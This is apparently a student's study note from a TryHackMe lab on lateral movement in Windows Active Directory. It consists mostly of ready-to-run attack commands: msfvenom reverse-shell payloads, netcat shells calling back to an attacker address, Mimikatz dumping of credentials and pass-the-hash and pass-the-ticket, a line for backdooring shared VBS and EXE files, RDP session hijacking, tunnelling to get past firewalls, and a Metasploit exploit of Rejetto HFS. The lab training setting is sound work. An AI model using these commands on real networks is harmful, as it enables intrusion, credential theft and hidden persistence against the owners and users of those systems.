#Windows #ActiveDirectory #LateralMovement 
## Moving Through the Network

##### What is Lateral Movement

Lateral Movement is a group of techniques to move around a network to reach our goals, bypass restrictions, establishing additional points of entry and to create confusion and avoid detection.

![[beccc46f65b8d16117d3d62f5c5dc380.png]]

##### A Quick Example

We might first only get access to a machine with little permissions and a lot of restrictions by the firewall, so we can try to harvest credentials and used it for another machine which is less restricted and raises less suspicion

##### The Attacker's Perspective

The simplest way to move laterally is by using administrative protocols like SSH, but we should try to be as silent as possible, for example logging with RDP from a computer in the IT department.

##### Administrators and UAC

There are 2 distinct administrator accounts with differences imposed by User Account Control (UAC), UAC restrict local administrators (not the default administrator account) from remotely connecting to a machine and performing administrative tasks unless using an interactive session trough are RDP, it will deny doing tasks trough RPC, SMB or WinRM since they will be logged with a filtered medium integrity token.

Domain accounts will have full administrative privileges, this security feature can be disabled and sometimes there will be no difference between the two.

## Spawning Processes Remotely

##### Psexec

- **Ports:** 445/TCP (SMB)
- **Required Group Memberships:** Administrators

Psexec allows administrator to run commands remotely on any PC he has access to.

It works this way:

1. Connect to Admin$ share and upload a service binary (psexesvc.exe).
2. Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`.
3. Create some named pipes to handle stdin/stdout/stderr.

![[a488102fe0da47a3667961400cf298d8.png]]

`psexec64.exe \\<MACHINE_IP> -u <username> -p <password> -i cmd.exe` - Run CMD using Psexec.

##### Remote Process Creation Using WinRM

- **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Remote Management Users

Windows Remote Management is a web based protocols to send Powershell commands to hosts remotely, most server installations will have WinRM enabled by default.

`winrs.exe -u:<username> -p:<password> -r:<target computer> cmd` Connect to a remote Powershell session from the command line.

We can reach the same from Powershell:

1. Create a PSCredentail object
	1. `$username = '<username>';`
	2. `$password = '<password>';`
	3. `$securePassword = ConvertTo-SecureString $password -AsPlainText -Force`
	4. `$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;`
2. Create an interactive session
	1. `Enter-PSSession -Computername <target computer> -Credential $credential` or run script blocks remotely with `Invoke-Command -Computername <target computer> -Credential $credential -ScriptBlock {whoami}`

##### Remotely Creating Services Using sc

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCE/RPC)
    - 445/TCP (RPC over SMB Named Pipes)
    - 139/TCP (RPC over SMB Named Pipes)
- **Required Group Memberships:** Administrators

If we configure a service to run an application, it'll execute it and fail afterwards.

sc.exe is used to create services on a remote host, when using sc it'll try to connect to the Service Control Manager (SVCCTL).

DCE / RPC will be used for a connection attempt, It'll first connect to the Endpoint Mapper (EPM), which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program, the EPM will than respond with which IP and port to connect to the SVCCTL, usually a dynamic port between 49152-65535.

![[c4f288e73da9c0f4d480ad817b365fe5.png]]

If the connection fails sc will try to reach SVCCTL trough SMB named pipes.

![[0c425c37d692c771c944e38dca8c5879.png]]

`sc.exe \\<target> create <service name> binPath= "net user <user> <password> /add" start= auto` - Create a service to create a new user, you won't be able to see any output since to OS is in charge of running services.

`sc.exe \\<target> start <service name>` - Start the service.
`sc.exe \\<target> stop <service name>` - Stop the service.
`sc.exe \\<target> delete <service name>` - Delete the service.

##### Creating Scheduled Tasks Remotely

`schtasks /s <target> /RU "SYSTEM" /create /tn "<task name>" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00` - Create a scheduled task that will run once.

`schtasks /s <target> /run /TN "<task name>"` - Run the scheduled task.

`schtasks /s <target> /TN "<task name>" /DELETE /F` - Delete the scheduled task.

##### Let's Get to Work

`msfvenom -p /windows/shell/reverse_tcp -f exe-service LHOST=<ip address> LPORT=<port> -o <output file name>` - Create a reverse shell in the service format.

`smbclient -c 'put <file name>' -U <username> -W ZA '//<domain>/admin$/' <password>` - Use smbclient to upload the payload to the ADMIN$ share of the target machine.

Now run `msfconsole` and than `use exploit/multi/handler` or run this:

`msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <ip address>; set LPORT <port>;exploit"`

`runas /netonly /user:<domain>\<username> "<nc64.exe file location> -e cmd.exe <attacker ip> <port>"` - Use Runas to spawn a second reverse shell, since we can't specify credentials as part of the sc command, and spawning a CMD with Runas directly trough SSH, we will not have access to the new command prompt, remember to type your password correctly.

`nc -lvp <port>` - Receive the connection.

`sc.exe \\<domain> create <service name> binPath= "%windir%\<payload name>" start= auto` - Create a new service.

`sc.exe \\thmiis.za.tryhackme.com start THMservice-3249` - Start the new service, you should now get a connection.

## Moving Laterally Using WMI

Windows Management Instrumentation (WMI) is Windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices, it allows administrators to perform standard management tasks.
##### Connecting to WMI From Powershell

First create a PSCredential object:

```powershell
$username = '<username>';
$password = '<password>';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
```

We can use 1 of the following protocols to establish WMI session:

- DCOM: RPC over IP, uses port 135/TCP and ports 49152-65535/TCP as with sc.exe.
- Wsman: Connecting with WinRM, uses ports 5985/TCP (WinRMÂ HTTP) or 5986/TCP (WinRM HTTPS).

`$Opt = New-CimSessionOption -Protocol DCOM` - Configure the connection options for the WMI session.
`$Session = New-Cimsession -ComputerName <target> -Credential $credential -SessionOption $Opt -ErrorAction Stop` - Establish a session against a remote host.

##### Remote Processes Creation Using WMI

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
        
- **Required Group Memberships:** Administrators

Send a WMI request to the Win32_Process class to spawn the process under the session we created before:

```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

`wmic.exe /user:<username> /password:<password> /node:<target> process call create "cmd.exe /c calc.exe"` - We can use this from the command prompt from legacy system for the same result.

##### Creating Services Remotely with WMI

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

Create services with WMI trough Powershell:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "<service name>";
DisplayName = "<name>";
PathName = "net user <username> <password> /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

`$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE '<service name>'"` - Get a handle on the service.
`Invoke-CimMethod -InputObject $Service -MethodName StartService` - Start the service.
`Invoke-CimMethod -InputObject $Service -MethodName StopService` - Stop the service.
`Invoke-CimMethod -InputObject $Service -MethodName Delete` - Delete the service.

##### Creating Scheduled Tasks Remotely with WMI

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

Create and execute scheduled tasks using default cmdlets:

```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user <username> <password> /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "<task name>"
Start-ScheduledTask -CimSession $Session -TaskName "<task name>"
```

`Unregister-ScheduledTask -CimSession $Session -TaskName "<task name>"` - Delete the scheduled task.

##### Installing MSI packages through WMI

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

MSI is a file format used for installers, we can attempt to use WMI to install a MSI package copied to the target system, we can attempt to install it by invoking the Win32_Product class through WMI:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

`wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi` - This will achieve the same result with CMD in legacy systems.

##### Let's Get to Work

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip address> LPORT=<port> -f msi > <file name>` - Create an MSI payload.

`smbclient -c 'put myinstaller.msi' -U <username> -W ZA '//thmiis.za.tryhackme.com/admin$/' <password>` - Copy the payload to the target machine, copying to the ADMIN$ share will make it available at C:\Windows\ on the server.

Now start a handler.

Start a WMI session:

```Powershell
$username = '<username>';
$password = '<password>';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName <target> -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

`Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}` - Invoke the install method from the Win32_Product class to trigger the payload, now you should get a connection.

## Use of Alternate Authentication Material

##### NTLM Authentication

![[9434c96e1bc0519f8d851b44d85b6702.png]]

1. The client sends an Authentication Request to the server they want access to.
2. The servers sends back a random number as a challenge.
3. The client combines the password and other known data with the challenge and sends a response back.
4. The server forwards both the challenge and response to the DC.
5. The server recalculates a response with the challenge and authenticate the client if it matches his response.
6. the server forwards the authentication result to the client.

All of this will happen locally with the hashes stored in the SAM if it's not a domain account.

##### Pass-the-Hash

If we end up with non-cracked NTLM password hashes and the windows domain is configured to use NTLM authentication, we can use pass-the-hash to authenticate.

**Extracting NTLM hashes from local SAM, only hashes from local users on the machine**:

From Mimikatz:

1. `privilege::debug`
2. `token::elevate`
3. `lsadump::sam`

**Extracting NTLM hashes from LSASS memory, for local users and domain users that recently logged into the machine:**

From Mimikatz:

1. `privilege::debug`
2. `token::elevate`
3. `sekurlsa::msv`

To perform pass-the-hash:

1. `token::revert` - Reestablish the original token privileges, or else PtH wouldn't work.
2. `sekurlsa::pth /user:<username> /domain:<domain name> /ntlm:<ntlm hash> /run:"<nc64.exe path> -e cmd.exe <attacker ip> <port>"` - Use PtH to run a reverse shell (you can run any other command you want).

Now `whoami` command will show the original user, but commands will use the injected credentials.

**Passing the hash using Linux:**

`xfreerdp /v:<victim ip> /u:<domain>\\<username> /pth:<ntlm hash>` - Connect to RDP.

`psexec.py -hashes <ntlm hash> <domain>/<username>@<ip address>` Connect via psexec.

`evil-winrm -i <ip address> -u <username> -H <ntlm hash>` - Connect to WinRM.

##### Kerberos Authentication

1. The user sends his username and a timestamp encrypted with a key derived from his password, to the Key Distribution Center (KDC) usually installed on the DC in charge of creating Kerberos tickets.

	Than the KDC will create and send back a Ticket Granting Ticket (TGT) so the user can use this to request tickets for specific services without sending his credentials, the KDC also sends a session key to generate the requests.

	The TGT is encrypted with the krbtgt account's password hash and isn't visible to the user, the KDC can decrypt the TGT to recover a copy of the session key.

![[855d6fa3ea4076164934a2ba9717ffb5.png]]

2. If the user wants to connect to a service in the network like a share, website or database he will send his username and timestamp encrypted using the session key, along with the TGT and a Service Principle Name which indicates the service and server name.

	The KDC will send a TGS and a Service Session Key, encrypted using the Service Owner Hash which is the user or machine account under which the service is run, the TGS contains a copy of the service session key.

![[0db01f1f1434f33fa8fb11de2bd165a6 2.png]]

3. The TGS can now be sent to the desired service to authenticate, the service will use his configured account's password hash to decrypt the TGS and validate the Service Session Key.

![[5d45b999328017c22b0f249069a88767.png]]

##### Pass-the-Ticket

`privilege::debug`
`sekurlsa::tickets /export` - Extract tickets and session keys from LSASS memory using mimikatz (you will need both to use the ticket).

We can extract TGS with low privileges, but we will usually want TGT that requires administrator credentials since it gives access to any service available to the user.

`kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi` - Inject the ticket into the current session from mimikatz.

`klist` - Check that the tickets were correctly injected.

##### Overpass-the-hash / Pass-the-Key

When a user requests TGT he sends his timestamp encrypted with a key derived from his password, the algorithm can be DES (disabled by default on current windows versions), RC4, AES128 or AES256, if we have any of those key we can ask the KDC for TGT without a password.

`privilege::debug`
`sekurlsa::ekeys` - Obtain the Kerberos encryption keys using mimikatz.

Commands to run from mimikatz to gain a reverse shell based on the available keys:

`sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"` - If we have the RC4 hash.

`sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"` - If we have the AES128 hash.

`sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"` - If we have the AES 256 hash.

If RC4 is one of the enabled protocols, you can also use NTLM hash you obtained since it's the same as RC4, this variant is known as Overpass-the-Hash (OPtH).

##### Let's Get to Work

You will need to authenticate with administrative credentials.

Use one of the attacks against a domain user.

`winrs.exe -r:<domain> cmd` - Use winrs to connect to a command prompt on a specific domain.

## Abusing User Behavior

##### Abusing Writable Shares

Sometimes administrators will place an executable in a writable share so each user won't have to download the app, if we have write permissions we can backdoor them so the user will execute the payload we want.

![[70e361f2a43b498e5d487d0394bd0a87.png]]

When a user executes a shortcut located in his system, the executable will be copied from the server to his %temp% directory and executed on the workstation by the logged in account.

##### Backdooring .vbs Scripts

If the resource is a VBS script, we can put a copy of nc64.exe on the share and inject the following code in the shared script:

`CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\<ip address>\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> <port>", 0, True`

When the user will open the VBS script it will copy the nc64.exe file to his %tmp% directory and will execute the reverse shell.

##### Backdooring .exe Files

If the shared file is a windows binary you can inject a backdoor with msfvenom, the file will work like regular while running the reverse shell in the background:

`msfvenom -a x64 --platform windows -x <.exe file> -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=<port> -b "\x00" -f exe -o <output file name>`

##### RDP hijacking

When Administrator connects to a machine trough RDP and closes the RDP client instead of logging off, the session will remain open indefinitely. If you have SYSTEM privileges on a Windows Server 2016 or earlier, you can take over existing RDP session without a password.

`<PsExec64.exe location> -s cmd.exe` - Use psexec to run CMD With SYSTEM privileges (you have to run CMD as administrator first).
`query user/session` - List the existing sessions on a server.

Sessions with a Disc state means the user left the session open and isn't using it at the moment, we can take over active session too (currently using) but it will kick the current user and will raise suspicion.

`tscon <session id> /dest:<current session name>` - Connect to a session using the active session name owned by the user you are currently connected with.

## Port Forwarding

Some ports may be blocked by the administrator or he can put segmentation around the network, we can use Port Forwarding the get around this.

##### SSH Tunneling

SSH as a built-in functionality to port forwarding (SSH Tunneling), Windows is now ships with OpenSSH client by default.

Let's say we gained access to PC-1 and want to access a port on another machine to which we can't directly connect to, we can start a tunnel from PC-1 machine using SSH client (since SSH server isn't usually installed on Windows systems) to our machine which will act as SSH server.

![[9fb527b63773be22aa214ea2d06d1351.png]]

`useradd <tunnel username> -m -d /home/<username> -s /bin/true` - Create a user in the attacker machine without access to console for tunneling.
`passwd <tunnel username>` - Set a password to use for creating the tunnels.

##### SSH Remote Port Forwarding

Remote Port Forwarding let's you to take reachable port from SSH client and project it into a remote SSH server, in this case if PC-1 can reach port 3389 but the attacker is blocked by the firewall Remote Port Forwarding can be used for pivoting.

![[49401a0687c38a1ce78fdd5852aca5a7.png]]

You will need port forwarding for example if you only have console access to PC-1 and can RDP into the server from there, or if you need a specific scripting language that isn't available in a machine you compromised.

`ssh <tunnel username>@<ip address> -R 3389:<target ip address>:3389 -N` - `-N` is to prevent the client from asking for a shell, `-R` requests a remote port forward, the first port is the port we will be opening at the SSH server, following by the IP and port of the socket we will be forwarding, port number don't have to match.

`xfreerdp /v:127.0.0.1 /u:<username> /p:<password>` - From the attacker machine RDP into the forwarded port to reach the server.

##### SSH Local Port Forwarding

Local Port Forwarding allows as to pull a port from an SSH server to SSH client, so if any host can't directly connect to as but can connect to PC-1 for example he can reach the attacker services trough the pivot host.

It gives us the ability to run reverse shells that usually wouldn't be able to connect back to us, or to make any service we want available to a machine that can't directly connect to us.

![[23c086c89a5bbe2fa364c95064235fb5.png]]

`ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N` - Forward port 80 from the attacker machine and make it available on PC-1, `-L` is for local port forwarding, `*:80` is the local socket used by PC-1 to receive connections and `127.0.0.1:80` is the remote socket to connect to from the attacker's perspective.

`netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80` - Add a firewall rule to allow incoming connections, administrative privileges are needed.

##### Port Forwarding With socat

Socat can be more detectable because we need to transfer it to the pivot host, but it's worth a shot when SSH isn't available.

`socat TCP4-LISTEN:1234,fork TCP4:<ip address>:4321` - Open port 1234 and forward any connection to port 4321 with the mentioned IP address.

With the `fork` option socat can handle multiple connections at the same time without closing.

`socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389` - In our example to connect with RDP you can use this command, it can't direct the connection to the attacker's machine directly like with SSH, but it will open a port on PC-1 that the attacker can then connect to.

![[d7128a0e5d344785ed570c2b8b90c775.png]]

`netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389` - You might need to add a firewall rule to allow any connections to that port.

`socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80` - Expose port 80 from the attacker's machine so it's reachable by the server, PC-1 will spawn port 80 and forwards the connections to that port to the attacker machine.

![[4874c8eb2e92a55b93c3dbbc2409e54b.png]]

##### Dynamic Port Forwarding and SOCKS

If we need to run scans against multiple ports of a host or even multiple host, we can use dynamic port forwarding to pivot trough a host and establish several connections to any IP address / ports we want by using SOCKS proxy.

`ssh tunneluser@1.1.1.1 -R 9050 -N` - Establish a reverse dynamic host, the SSH server will start a SOCKS proxy on port 9050 and forward any connection request trough SSH tunnel, where they are finally proxied by the SSH client.

We can easily use any of our tools through the SOCKS proxy using proxychains, we need to first make sure proxychains is configured correctly to point any connection to the same port used by SSH for SOCKS proxy server, the configuration file can be found at `/etc/proxychains.conf`, at the end there is a line that indicates the port in use for socks proxy.

```shell-session
[ProxyList]
socks4  127.0.0.1 9050
```

The default is 9050, now to execute commands:

`proxychains curl http://pxeboot.za.tryhackme.com`

Some software like Nmap might don't work so well trough proxychains.

##### Let's Get to Work

`socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389` - Example of using socat to be able to run RDP.

`xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020` - Now you can connect with RDP.

##### Tunneling Complex Exploits

The THMDC server is running a vulnerable version of Regetto HFS, with firewall restrictions the vulnerable port can only be accessed from THMJMP2, outbound connections from THMDC are only allowed machines in the local network so a reverse shell directly to the attacker machine is impossible. To make things worse the exploit requires the attacker to host an HTTP server to trigger the final payload, so we need to find a way to host the HTTP server in one of the machines in the same network which isn't convenient, with port forwarding we can overcome all of this.

The exploit will first connect to the HFS port to trigger a second connection that will be made against the attacker's machine  on `SRVPORT`, where a web server will deliver the final payload, which will execute and send back a reverse shell to the attacker.

![[618de3db53e103f3df56ae922f66e879.png]]

We can use SSH to forward some ports from the attacker machine to THMJMP2 (SRVPORT and LPORT) and pivot through THMJMP2 to reach RPORT on THMDC, we would need 3 port forwards in both directions.

![[dbbc833670f1a7ed6f76eeac7d8bd1ee.png]]

Rejetto HFS will listen with port 80, so we will need tunnel this port to the attacking machine trough THMJMP2 with a non occupied port, so we will add `-R 8888:thmdc.za.tryhackme.com:80` to our SSH command running from THMJMP2.

Let's say we use port 6666 for SRVPORT and port 7878 for LPORT, so we need to add `-L *:6666:127.0.0.1:6666` and `-L *:7878:127.0.0.1:7878` to our SSH command to bind those ports on THMJMP2 and tunnel the connections to our machines.

`ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N` - The final SSH command.

Now we can configure the exploit in Metasploit:

```shell-session
user@AttackBox$ msfconsole
msf6 > use rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp

msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7878 
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666

msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```

- With the LHOST parameter we configure THMJMP2 as the listener since THMDC can't reach us, we also set the `ReverseListenerBindAddress` optional option to bind the attacker's address on 127.0.0.1.
- We set the SRVHOST to 127.0.0.1 since THMJMP2 will be able to forward any connection received on the SRVPORT to the attacker's machine.
- The RHOSTS option is also set to 127.0.0.1 since the SSH tunnel established with THMJMP2 will forward the requests to THMDC, RPORT is set to 8888 since any connection to that port on the attacker machine will be forwarded to port 80 on THMDC.